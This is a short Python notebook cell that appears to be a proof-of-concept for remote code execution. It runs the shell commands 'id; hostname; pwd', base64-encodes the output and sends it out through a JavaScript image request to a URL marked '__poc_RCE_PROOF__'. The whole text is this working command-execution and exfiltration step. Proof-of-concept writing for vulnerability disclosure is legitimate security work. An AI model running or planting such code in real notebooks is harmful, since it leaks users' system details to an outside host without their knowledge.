# %%
import os, base64
r = os.popen('id; hostname; pwd').read()
b = base64.urlsafe_b64encode(r.encode()).decode()
from IPython.display import Javascript, display
display(Javascript("new Image().src='https://colab.research.google.com/__poc_RCE_PROOF__?b64=" + b + "'"))

# %%
# helper
